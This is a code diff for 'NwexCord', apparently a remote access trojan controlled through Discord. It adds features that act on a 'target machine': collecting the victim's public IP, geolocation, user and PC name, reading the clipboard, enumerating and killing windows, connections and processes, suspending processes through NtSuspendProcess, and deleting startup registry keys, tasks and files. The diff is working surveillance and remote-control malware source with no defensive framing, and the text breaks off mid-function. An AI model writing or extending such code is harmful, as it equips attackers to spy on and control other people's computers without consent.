@@ -14,10 +14,26 @@ import platform
 import uuid
 import ctypes
 import locale
+import webbrowser
+import threading
+import base64
+import asyncio
 import config
 
 def get_sys_info():
     info = {}
+    
+    info["IP"] = "Unknown"
+    info["Location"] = "Unknown"
+    try:
+        import urllib.request, json
+        req = urllib.request.Request("http://ip-api.com/json", headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=5) as response:
+            data = json.loads(response.read().decode())
+            info["IP"] = data.get("query", "Unknown")
+            info["Location"] = f"{data.get('city', 'Unknown')}, {data.get('regionName', 'Unknown')}, {data.get('country', 'Unknown')}"
+    except Exception:
+        pass
     
     info["UserName"] = os.getlogin()
     info["PCName"] = platform.node()
@@ -136,26 +152,7 @@ class ShellExecutor:
 # ========================================
 
 TOOL_COMMANDS = {
-    "activewindows": {
-        "title": "🪟 Active Windows",
-        "cmd": 'powershell "Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object -Property Id, ProcessName, MainWindowTitle | Format-Table -AutoSize"',
-        "description": "Currently visible windows"
-    },
-    "tcp": {
-        "title": "🌐 TCP Connections",
-        "cmd": 'netstat -an | findstr ESTABLISHED',
-        "description": "Active TCP connections"
-    },
-    "startup": {
-        "title": "🚀 Startup Manager",
-        "cmd": 'powershell "Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-Table -AutoSize"',
-        "description": "Programs that run at startup"
-    },
-    "process": {
-        "title": "📊 Process Manager",
-        "cmd": 'powershell "Get-Process | Sort-Object -Descending CPU | Select-Object -First 20 Id, ProcessName, @{N=\'CPU(s)\';E={[math]::Round($_.CPU,1)}}, @{N=\'RAM(MB)\';E={[math]::Round($_.WS/1MB,1)}} | Format-Table -AutoSize"',
-        "description": "Top 20 processes by CPU usage"
-    },
+
     "service": {
         "title": "🔧 Service Manager",
         "cmd": 'powershell "Get-Service | Where-Object {$_.Status -eq \'Running\'} | Select-Object -First 25 Status, Name, DisplayName | Format-Table -AutoSize"',
@@ -166,17 +163,21 @@ TOOL_COMMANDS = {
         "cmd": 'powershell "Get-Clipboard"',
         "description": "Current clipboard content"
     },
-    "programs": {
-        "title": "💿 Installed Programs",
-        "cmd": 'powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName -ne $null} | Sort-Object DisplayName | Format-Table -AutoSize"',
-        "description": "All installed programs"
-    },
+
 }
 
 async def run_tool(interaction: discord.Interaction, tool_key: str):
-    """Execute a tool command and send the result as an embed."""
+    """Execute a tool command and edit the current message with the result."""
     tool = TOOL_COMMANDS[tool_key]
-    await interaction.response.defer(thinking=True)
+    
+    # Show loading state by editing the message
+    loading_embed = discord.Embed(
+        title=f"⏳ {tool['title']}",
+        description=f"*{tool['description']}*\n\n⏳ Executing...",
+        color=discord.Color.greyple()
+    )
+    loading_embed.set_footer(text="NwexCord • Tools")
+    await interaction.response.edit_message(content=None, embed=loading_embed, view=None)
     
     result = ShellExecutor.execute(tool["cmd"])
     
@@ -198,7 +199,435 @@ async def run_tool(interaction: discord.Interaction, tool_key: str):
     )
     embed.set_footer(text="NwexCord • Tools")
     
-    await interaction.followup.send(embed=embed)
+    view = ToolResultView(tool_key)
+    await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+
+class ToolResultView(discord.ui.View):
+    """View shown after a tool executes, with Refresh and Back buttons."""
+    def __init__(self, tool_key: str):
+        super().__init__(timeout=300)
+        self.tool_key = tool_key
+    
+    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=0)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await run_tool(interaction, self.tool_key)
+    
+    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=0)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        tools_embed = discord.Embed(
+            title="🧰 NwexCord Tools",
+            description="Select a tool from the buttons below to execute it on the target machine.",
+            color=discord.Color.blurple()
+        )
+        tools_embed.set_footer(text="NwexCord • Tools Panel")
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
+
+
+def embed_tools_panel():
+    """Create the tools panel embed."""
+    embed = discord.Embed(
+        title="🧰 NwexCord Tools",
+        description="Select a tool from the buttons below to execute it on the target machine.",
+        color=discord.Color.blurple()
+    )
+    embed.set_footer(text="NwexCord • Tools Panel")
+    return embed
+
+
+# ========================================
+# Interactive ActiveWindows UI
+# ========================================
+
+class ActiveWindowsManager:
+    """Helper class to enumerate visible windows using ctypes."""
+    
+    @staticmethod
+    def get_windows():
+        """Returns a list of dicts with 'title' and 'handle' for all visible windows."""
+        import ctypes
+        from ctypes import wintypes
+        
+        user32 = ctypes.windll.user32
+        EnumWindows = user32.EnumWindows
+        EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
+        GetWindowTextW = user32.GetWindowTextW
+        GetWindowTextLengthW = user32.GetWindowTextLengthW
+        IsWindowVisible = user32.IsWindowVisible
+        
+        windows = []
+        
+        def callback(hwnd, lparam):
+            if IsWindowVisible(hwnd):
+                length = GetWindowTextLengthW(hwnd)
+                if length > 0:
+                    buf = ctypes.create_unicode_buffer(length + 1)
+                    GetWindowTextW(hwnd, buf, length + 1)
+                    title = buf.value.strip()
+                    if title:
+                        windows.append({"title": title, "handle": hwnd})
+            return True
+        
+        EnumWindows(EnumWindowsProc(callback), 0)
+        return windows
+    
+    @staticmethod
+    def close_window(hwnd: int):
+        """Send WM_CLOSE to a window handle."""
+        import ctypes
+        WM_CLOSE = 0x0010
+        try:
+            ctypes.windll.user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
+            return True, "Window close signal sent."
+        except Exception as e:
+            return False, str(e)
+
+
+def build_activewindows_embed(session_id: str, selected_idx: int = -1):
+    """Build the ActiveWindows embed with a table-style layout."""
+    windows = ActiveWindowsManager.get_windows()
+    
+    # Build table header
+    header = f"{'[ ActiveWindow ]':<42} {'[ Handle ]':>10}"
+    sep = "━" * 54
+    
+    # Build rows
+    rows = ""
+    for i, w in enumerate(windows):
+        title = w['title']
+        if len(title) > 38:
+            title = title[:35] + "..."
+        handle_str = str(w['handle'])
+        
+        # Mark selected row
+        if i == selected_idx:
+            marker = "►"
+        else:
+            marker = " "
+        
+        icon = "🪟"
+        rows += f"{marker} {icon} {title:<38} {handle_str:>10}\n"
+    
+    if not windows:
+        rows = "  (No visible windows found)\n"
+    
+    table_block = f"```\n{header}\n{sep}\n{rows}```"
+    
+    # Truncate if too long for embed
+    if len(table_block) > 4000:
+        table_block = table_block[:3990] + "\n...```"
+    
+    selected_count = 1 if selected_idx >= 0 else 0
+    
+    embed = discord.Embed(
+        title=f"🪟 ActiveWindows : {session_id}",
+        description=table_block,
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+    embed.set_footer(text=f"Selected [{selected_count}]  Windows [{len(windows)}]")
+    
+    return embed, windows
+
+
+class ActiveWindowsSelect(discord.ui.Select):
+    """Dropdown to select a window from the list."""
+    def __init__(self, windows: list, session_id: str):
+        self.session_id = session_id
+        self.windows_data = windows
+        
+        if windows:
+            options = []
+            for i, w in enumerate(windows[:25]):  # Discord max 25 options
+                label = w['title'][:100] if len(w['title']) > 100 else w['title']
+                options.append(discord.SelectOption(
+                    label=label,
+                    description=f"Handle: {w['handle']}",
+                    value=str(i),
+                    emoji="🪟"
+                ))
+        else:
+            options = [discord.SelectOption(label="(no windows)", value="_none")]
+        
+        super().__init__(placeholder="🪟 Select a window...", options=options, row=0)
+    
+    async def callback(self, interaction: discord.Interaction):
+        selected = self.values[0]
+        if selected == "_none":
+            await interaction.response.defer()
+            return
+        
+        idx = int(selected)
+        embed, windows = build_activewindows_embed(self.session_id, selected_idx=idx)
+        view = ActiveWindowsView(self.session_id, selected_idx=idx)
+        await interaction.response.edit_message(embed=embed, view=view)
+
+
+class ActiveWindowsView(discord.ui.View):
+    """Interactive view for ActiveWindows with Refresh and Close buttons."""
+    def __init__(self, session_id: str, selected_idx: int = -1):
+        super().__init__(timeout=300)
+        self.session_id = session_id
+        self.selected_idx = selected_idx
+        
+        # Get current windows for the dropdown
+        windows = ActiveWindowsManager.get_windows()
+        self.windows_data = windows
+        
+        # Add select dropdown
+        self.add_item(ActiveWindowsSelect(windows, session_id))
+    
+    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=1)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        embed, windows = build_activewindows_embed(self.session_id)
+        view = ActiveWindowsView(self.session_id)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Close", emoji="❌", style=discord.ButtonStyle.danger, row=1)
+    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.selected_idx < 0 or self.selected_idx >= len(self.windows_data):
+            await interaction.response.send_message("❌ Please select a window first!", ephemeral=True)
+            return
+        
+        target = self.windows_data[self.selected_idx]
+        success, msg = ActiveWindowsManager.close_window(target['handle'])
+        
+        # After closing, refresh the window list in the same message
+        embed, windows = build_activewindows_embed(self.session_id)
+        
+        # Add status info to embed
+        if success:
+            embed.add_field(name="✅ Closed", value=f"`{target['title']}`", inline=False)
+        else:
+            embed.add_field(name="❌ Failed", value=f"`{target['title']}` — {msg}", inline=False)
+        
+        view = ActiveWindowsView(self.session_id)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
+
+
+# ========================================
+# Interactive TCP Connections UI
+# ========================================
+
+class TCPConnectionsManager:
+    """Helper class to get TCP connection data via netstat."""
+    
+    STATE_ICONS = {
+        "ESTABLISHED": "\ud83d\udfe2",
+        "LISTENING": "\ud83d\udd35",
+        "TIME_WAIT": "\ud83d\udfe1",
+        "CLOSE_WAIT": "\ud83d\udfe0",
+        "FIN_WAIT_1": "\ud83d\udfe3",
+        "FIN_WAIT_2": "\ud83d\udfe3",
+        "SYN_SENT": "\u26aa",
+        "SYN_RECEIVED": "\u26aa",
+        "LAST_ACK": "\ud83d\udd34",
+        "CLOSING": "\ud83d\udd34",
+        "CLOSED": "\u26ab",
+    }
+    
+    @staticmethod
+    def get_connections():
+        """Parse netstat -ano output into structured data."""
+        try:
+            result = subprocess.run(
+                'netstat -ano',
+                shell=True, capture_output=True, text=True,
+                timeout=15, encoding='utf-8', errors='replace'
+            )
+            connections = []
+            for line in result.stdout.strip().split('\n'):
+                line = line.strip()
+                if not line or line.startswith('Active') or line.startswith('Proto'):
+                    continue
+                parts = line.split()
+                if len(parts) >= 4 and parts[0] == 'TCP':
+                    conn = {
+                        "local": parts[1],
+                        "remote": parts[2],
+                        "state": parts[3] if len(parts) > 3 else "UNKNOWN",
+                        "pid": parts[4] if len(parts) > 4 else "0",
+                    }
+                    connections.append(conn)
+            return connections
+        except Exception:
+            return []
+    
+    @staticmethod
+    def close_connection(pid: str):
+        """Kill the process associated with a TCP connection given its PID."""
+        if not pid or pid == "0":
+            return False, "Cannot close a connection with PID 0 (System process)."
+        try:
+            result = subprocess.run(
+                f'taskkill /F /PID {pid}',
+                shell=True, capture_output=True, text=True,
+                timeout=10, encoding='utf-8', errors='replace'
+            )
+            if result.returncode == 0:
+                return True, "Process terminated successfully."
+            else:
+                return False, result.stderr.strip() or "Failed to terminate process."
+        except Exception as e:
+            return False, str(e)
+
+
+def build_tcp_embed(session_id: str, page: int = 0, connections: list = None, selected_idx: int = -1):
+    """Build the TCP Connections embed with table layout and pagination."""
+    if connections is None:
+        connections = TCPConnectionsManager.get_connections()
+    
+    per_page = 15
+    total = len(connections)
+    total_pages = max(1, (total + per_page - 1) // per_page)
+    page = max(0, min(page, total_pages - 1))
+    
+    start = page * per_page
+    end = min(start + per_page, total)
+    page_conns = connections[start:end]
+    
+    # Build table
+    header = f"{'[PID]':<8} {'[LocalAddress]':<24} {'[RemoteAddress]':<24} {'[State]'}"
+    sep = "\u2501" * 72
+    
+    rows = ""
+    for c in page_conns:
+        icon = TCPConnectionsManager.STATE_ICONS.get(c['state'], "\u26ab")
+        pid = c['pid'][:6]
+        local = c['local'][:22]
+        remote = c['remote'][:22]
+        state = c['state']
+        rows += f"{icon} {pid:<6} {local:<22} {remote:<22} {state}\n"
+    
+    if not connections:
+        rows = "  (No TCP connections found)\n"
+    
+    table_block = f"```\n{header}\n{sep}\n{rows}```"
+    
+    if len(table_block) > 4000:
+        table_block = table_block[:3990] + "\n...```"
+    
+    embed = discord.Embed(
+        title=f"\ud83c\udf10 TCP Connections : {session_id}",
+        description=table_block,
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+    selected_count = 1 if selected_idx >= 0 else 0
+    embed.set_footer(text=f"Page [{page+1}/{total_pages}]  Selected [{selected_count}]  Connections [{total}]")
+    
+    return embed, connections, page, total_pages
+
+
+class TCPConnectionsSelect(discord.ui.Select):
+    """Dropdown to select a connection from the current page."""
+    def __init__(self, session_id: str, page: int, connections: list):
+        self.session_id = session_id
+        self.page = page
+        self.connections_data = connections
+        
+        per_page = 15
+        start = page * per_page
+        end = min(start + per_page, len(connections))
+        page_conns = connections[start:end]
+        
+        if page_conns:
+            options = []
+            for i, c in enumerate(page_conns):
+                overall_idx = start + i
+                label = f"PID: {c['pid']} | {c['local']} -> {c['remote']}"
+                label = label[:100]
+                status_emoji = TCPConnectionsManager.STATE_ICONS.get(c['state'], "⚫")
+                options.append(discord.SelectOption(
+                    label=label,
+                    description=f"State: {c['state']}",
+                    value=str(overall_idx),
+                    emoji=status_emoji
+                ))
+        else:
+            options = [discord.SelectOption(label="(no connections)", value="_none")]
+        
+        super().__init__(placeholder="🌐 Select a connection to manage...", options=options, row=0)
+    
+    async def callback(self, interaction: discord.Interaction):
+        selected = self.values[0]
+        if selected == "_none":
+            await interaction.response.defer()
+            return
+        
+        idx = int(selected)
+        embed, conns, pg, tp = build_tcp_embed(self.session_id, self.page, self.connections_data, selected_idx=idx)
+        view = TCPConnectionsView(self.session_id, pg, self.connections_data, selected_idx=idx)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+
+class TCPConnectionsView(discord.ui.View):
+    """Interactive view for TCP Connections with pagination."""
+    def __init__(self, session_id: str, page: int = 0, connections: list = None, selected_idx: int = -1):
+        super().__init__(timeout=300)
+        self.session_id = session_id
+        self.page = page
+        self.selected_idx = selected_idx
+        self.connections = connections if connections is not None else TCPConnectionsManager.get_connections()
+        self.total_pages = max(1, (len(self.connections) + 14) // 15)
+        
+        # Add select dropdown on row 0
+        self.add_item(TCPConnectionsSelect(session_id, page, self.connections))
+    
+    @discord.ui.button(label="\u25c0", style=discord.ButtonStyle.secondary, row=1)
+    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_page = max(0, self.page - 1)
+        embed, conns, pg, tp = build_tcp_embed(self.session_id, new_page, self.connections)
+        view = TCPConnectionsView(self.session_id, pg, self.connections)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="\u25b6", style=discord.ButtonStyle.secondary, row=1)
+    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_page = min(self.total_pages - 1, self.page + 1)
+        embed, conns, pg, tp = build_tcp_embed(self.session_id, new_page, self.connections)
+        view = TCPConnectionsView(self.session_id, pg, self.connections)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_conns = TCPConnectionsManager.get_connections()
+        embed, conns, pg, tp = build_tcp_embed(self.session_id, 0, new_conns)
+        view = TCPConnectionsView(self.session_id, 0, new_conns)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        
+    @discord.ui.button(label="Close", emoji="\u274c", style=discord.ButtonStyle.danger, row=1)
+    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.selected_idx < 0 or self.selected_idx >= len(self.connections):
+            await interaction.response.send_message("\u274c Please select a connection first!", ephemeral=True)
+            return
+            
+        target = self.connections[self.selected_idx]
+        success, msg = TCPConnectionsManager.close_connection(target['pid'])
+        
+        # After closing, refresh the connection list in the same message
+        new_conns = TCPConnectionsManager.get_connections()
+        
+        # Adjust page if necessary
+        per_page = 15
+        total = len(new_conns)
+        total_pages = max(1, (total + per_page - 1) // per_page)
+        page = max(0, min(self.page, total_pages - 1))
+        
+        embed, conns, pg, tp = build_tcp_embed(self.session_id, page, new_conns)
+        
+        if success:
+            embed.add_field(name="\u2705 Terminated", value=f"`PID: {target['pid']}`", inline=False)
+        else:
+            embed.add_field(name="\u274c Failed", value=f"`PID: {target['pid']}` \u2014 {msg}", inline=False)
+            
+        view = TCPConnectionsView(self.session_id, pg, new_conns)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=1)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
 
 
 # ========================================
@@ -646,6 +1075,1451 @@ class RegistryView(discord.ui.View):
         embed = build_registry_embed(path, self.session_id)
         view = RegistryView(path, self.session_id, page=0)
         await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=4)
+    async def back_tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
+
+
+# ========================================
+# Interactive Startup Manager UI
+# ========================================
+
+class StartupManager:
+    """Helper class to gather startup items from 3 sources."""
+    
+    # Startup folder paths
+    USER_STARTUP = os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup')
+    COMMON_STARTUP = os.path.join(os.environ.get('PROGRAMDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup')
+    
+    # Registry Run keys
+    REG_KEYS = [
+        r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run',
+        r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce',
+        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
+    ]
+    
+    @staticmethod
+    def get_startup_files():
+        """Get items from Startup folders."""
+        items = []
+        for folder in [StartupManager.USER_STARTUP, StartupManager.COMMON_STARTUP]:
+            try:
+                if os.path.isdir(folder):
+                    for f in os.listdir(folder):
+                        full_path = os.path.join(folder, f)
+                        items.append({
+                            'name': f,
+                            'type': 'File',
+                            'path': folder,
+                            'full_path': full_path,
+                            'source': 'file',
+                            'icon': '📄'
+                        })
+            except Exception:
+                pass
+        return items
+    
+    @staticmethod
+    def get_registry_entries():
+        """Get startup entries from Registry Run keys."""
+        items = []
+        for key_path in StartupManager.REG_KEYS:
+            try:
+                result = subprocess.run(
+                    f'reg query "{key_path}"',
+                    shell=True, capture_output=True, text=True,
+                    timeout=10, encoding='utf-8', errors='replace'
+                )
+                for line in result.stdout.strip().split('\n'):
+                    line = line.strip()
+                    if not line or line.startswith('HKEY') or line.startswith('End'):
+                        continue
+                    parts = line.split(None, 2)
+                    if len(parts) >= 3:
+                        items.append({
+                            'name': parts[0],
+                            'type': 'Registry',
+                            'path': key_path,
+                            'full_path': parts[2],
+                            'source': 'registry',
+                            'reg_key': key_path,
+                            'reg_name': parts[0],
+                            'icon': '🔑'
+                        })
+            except Exception:
+                pass
+        return items
+    
+    @staticmethod
+    def get_scheduled_tasks():
+        """Get startup-related scheduled tasks."""
+        items = []
+        try:
+            # Get tasks that trigger on Boot or Logon
+            cmd = "powershell \"Get-ScheduledTask | Where-Object { $_.Triggers.CimClass.CimClassName -match 'BootTrigger|LogonTrigger' } | Select-Object TaskPath, TaskName | Format-Table -HideTableHeaders\""
+            result = subprocess.run(
+                cmd,
+                shell=True, capture_output=True, text=True,
+                timeout=15, encoding='utf-8', errors='replace'
+            )
+            for line in result.stdout.strip().split('\n'):
+                line = line.strip()
+                if not line:
+                    continue
+                # Output format: \Microsoft\Windows\AppID\    VerifiedPublisherCertStoreCheck
+                # Split by space, first part is path, rest is name
+                parts = line.split(None, 1)
+                if len(parts) >= 2:
+                    task_path = parts[0].strip()
+                    task_name = parts[1].strip()
+                    full_task_name = f"{task_path}{task_name}" if task_path.endswith('\\') else f"{task_path}\\{task_name}"
+                    
+                    items.append({
+                        'name': task_name,
+                        'type': 'Task',
+                        'path': task_path,
+                        'full_path': full_task_name,
+                        'source': 'task',
+                        'task_name': full_task_name,
+                        'icon': '⏰'
+                    })
+        except Exception:
+            pass
+        return items
+    
+    @staticmethod
+    def get_all_items():
+        """Gather startup items from all 3 sources."""
+        items = []
+        items.extend(StartupManager.get_startup_files())
+        items.extend(StartupManager.get_registry_entries())
+        items.extend(StartupManager.get_scheduled_tasks())
+        return items
+    
+    @staticmethod
+    def remove_item(item: dict):
+        """Remove a startup item based on its source."""
+        try:
+            if item['source'] == 'file':
+                path = item['full_path']
+                if os.path.isfile(path):
+                    os.remove(path)
+                    return True, f"File deleted: {item['name']}"
+                elif os.path.isdir(path):
+                    import shutil
+                    shutil.rmtree(path)
+                    return True, f"Folder deleted: {item['name']}"
+                else:
+                    return False, "File not found."
+            
+            elif item['source'] == 'registry':
+                result = subprocess.run(
+                    f'reg delete "{item["reg_key"]}" /v "{item["reg_name"]}" /f',
+                    shell=True, capture_output=True, text=True,
+                    timeout=10, encoding='utf-8', errors='replace'
+                )
+                if result.returncode == 0:
+                    return True, f"Registry value deleted: {item['name']}"
+                return False, result.stderr.strip() or "Failed to delete registry value."
+            
+            elif item['source'] == 'task':
+                result = subprocess.run(
+                    f'schtasks /delete /tn "{item["task_name"]}" /f',
+                    shell=True, capture_output=True, text=True,
+                    timeout=10, encoding='utf-8', errors='replace'
+                )
+                if result.returncode == 0:
+                    return True, f"Task deleted: {item['name']}"
+                return False, result.stderr.strip() or "Failed to delete task."
+            
+            return False, "Unknown source type."
+        except Exception as e:
+            return False, str(e)
+
+
+def build_startup_embed(session_id: str, items: list = None, selected_idx: int = -1):
+    """Build the Startup Manager embed with table-style layout."""
+    if items is None:
+        items = StartupManager.get_all_items()
+    
+    # Build table header
+    header = f"{'[ Name ]':<38} {'[ Type ]':<10} {'[ Path ]'}"
+    sep = "━" * 72
+    
+    rows = ""
+    for i, item in enumerate(items):
+        name = item['name']
+        if len(name) > 34:
+            name = name[:31] + "..."
+        
+        path_display = item['path']
+        if len(path_display) > 38:
+            path_display = path_display[:35] + "..."
+        
+        marker = "►" if i == selected_idx else " "
+        icon = item['icon']
+        item_type = item['type']
+        
+        rows += f"{marker} {icon} {name:<34} {item_type:<8} {path_display}\n"
+    
+    if not items:
+        rows = "  (No startup items found)\n"
+    
+    table_block = f"```\n{header}\n{sep}\n{rows}```"
+    
+    if len(table_block) > 4000:
+        table_block = table_block[:3990] + "\n...```"
+    
+    selected_count = 1 if selected_idx >= 0 else 0
+    
+    embed = discord.Embed(
+        title=f"🚀 Startup Manager : {session_id}",
+        description=table_block,
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+    embed.set_footer(text=f"Selected [{selected_count}]  Startup [{len(items)}]")
+    
+    return embed, items
+
+
+class StartupSelect(discord.ui.Select):
+    """Dropdown to select a startup item from the list."""
+    def __init__(self, items: list, session_id: str):
+        self.session_id = session_id
+        self.items_data = items
+        
+        if items:
+            options = []
+            for i, item in enumerate(items[:25]):  # Discord max 25 options
+                label = item['name'][:100] if len(item['name']) > 100 else item['name']
+                desc = f"{item['type']} — {item['path']}"
+                options.append(discord.SelectOption(
+                    label=label,
+                    description=desc[:100],
+                    value=str(i),
+                    emoji=item['icon']
+                ))
+        else:
+            options = [discord.SelectOption(label="(no items)", value="_none")]
+        
+        super().__init__(placeholder="🚀 Select a startup item...", options=options, row=0)
+    
+    async def callback(self, interaction: discord.Interaction):
+        selected = self.values[0]
+        if selected == "_none":
+            await interaction.response.defer()
+            return
+        
+        idx = int(selected)
+        embed, items = build_startup_embed(self.session_id, self.items_data, selected_idx=idx)
+        view = StartupManagerView(self.session_id, self.items_data, selected_idx=idx)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+
+class StartupManagerView(discord.ui.View):
+    """Interactive view for Startup Manager with Remove, Refresh, and Back."""
+    def __init__(self, session_id: str, items: list = None, selected_idx: int = -1):
+        super().__init__(timeout=300)
+        self.session_id = session_id
+        self.selected_idx = selected_idx
+        self.items_data = items if items is not None else StartupManager.get_all_items()
+        
+        # Add select dropdown
+        self.add_item(StartupSelect(self.items_data, session_id))
+    
+    @discord.ui.button(label="Remove", emoji="🗑️", style=discord.ButtonStyle.danger, row=1)
+    async def remove_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.selected_idx < 0 or self.selected_idx >= len(self.items_data):
+            await interaction.response.send_message("❌ Please select a startup item first!", ephemeral=True)
+            return
+        
+        target = self.items_data[self.selected_idx]
+        success, msg = StartupManager.remove_item(target)
+        
+        # After removing, refresh the list
+        new_items = StartupManager.get_all_items()
+        embed, items = build_startup_embed(self.session_id, new_items)
+        
+        if success:
+            embed.add_field(name="✅ Removed", value=f"`{target['name']}` ({target['type']})", inline=False)
+        else:
+            embed.add_field(name="❌ Failed", value=f"`{target['name']}` — {msg}", inline=False)
+        
+        view = StartupManagerView(self.session_id, new_items)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=1)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        new_items = StartupManager.get_all_items()
+        embed, items = build_startup_embed(self.session_id, new_items)
+        view = StartupManagerView(self.session_id, new_items)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
+
+
+# ========================================
+# Interactive Process Manager UI
+# ========================================
+
+class ProcessManager:
+    """Helper class to get process data and manage processes."""
+    
+    @staticmethod
+    def get_processes():
+        """Get list of running processes with Name, PID, Description."""
+        try:
+            cmd = 'powershell "Get-Process | Select-Object ProcessName, Id, Description | Sort-Object ProcessName | Format-Table -HideTableHeaders"'
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True,
+                timeout=15, encoding='utf-8', errors='replace'
+            )
+            processes = []
+            seen = set()
+            for line in result.stdout.strip().split('\n'):
+                line = line.strip()
+                if not line:
+                    continue
+                parts = line.split(None, 2)
+                if len(parts) >= 2:
+                    name = parts[0].strip()
+                    try:
+                        pid = int(parts[1].strip())
+                    except ValueError:
+                        continue
+                    desc = parts[2].strip() if len(parts) >= 3 else ""
+                    key = f"{name}_{pid}"
+                    if key not in seen:
+                        seen.add(key)
+                        processes.append({
+                            'name': f"{name}.exe",
+                            'pid': pid,
+                            'description': desc if desc else name,
+                        })
+            return processes
+        except Exception:
+            return []
+    
+    @staticmethod
+    def close_process(pid: int):
+        """Kill a process by PID."""
+        try:
+            result = subprocess.run(
+                f'taskkill /F /PID {pid}',
+                shell=True, capture_output=True, text=True,
+                timeout=10, encoding='utf-8', errors='replace'
+            )
+            if result.returncode == 0:
+                return True, "Process terminated."
+            return False, result.stderr.strip() or "Failed to terminate."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def restart_process(pid: int, name: str):
+        """Kill and restart a process."""
+        try:
+            # First get the executable path
+            cmd = f'powershell "(Get-Process -Id {pid}).Path"'
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True,
+                timeout=10, encoding='utf-8', errors='replace'
+            )
+            exe_path = result.stdout.strip()
+            
+            if not exe_path or not os.path.exists(exe_path):
+                return False, "Could not find executable path."
+            
+            # Kill the process
+            subprocess.run(f'taskkill /F /PID {pid}', shell=True, timeout=10)
+            
+            # Start it again
+            subprocess.Popen(exe_path, shell=True)
+            return True, f"Process restarted: {name}"
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def suspend_process(pid: int):
+        """Suspend a process using PowerShell."""
+        try:
+            cmd = f'powershell "(Get-Process -Id {pid}).Suspend()"'
+            # Use pssuspend alternative via debug API
+            cmd = f'powershell "$proc = Get-Process -Id {pid}; $proc.Suspend()"'
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True,
+                timeout=10, encoding='utf-8', errors='replace'
+            )
+            # Suspend via NtSuspendProcess
+            import ctypes
+            PROCESS_SUSPEND_RESUME = 0x0800
+            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
+            if handle:
+                ntdll = ctypes.windll.ntdll
+                ntdll.NtSuspendProcess(handle)
+                ctypes.windll.kernel32.CloseHandle(handle)
+                return True, "Process suspended."
+            return False, "Could not open process."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def resume_process(pid: int):
+        """Resume a suspended process."""
+        try:
+            import ctypes
+            PROCESS_SUSPEND_RESUME = 0x0800
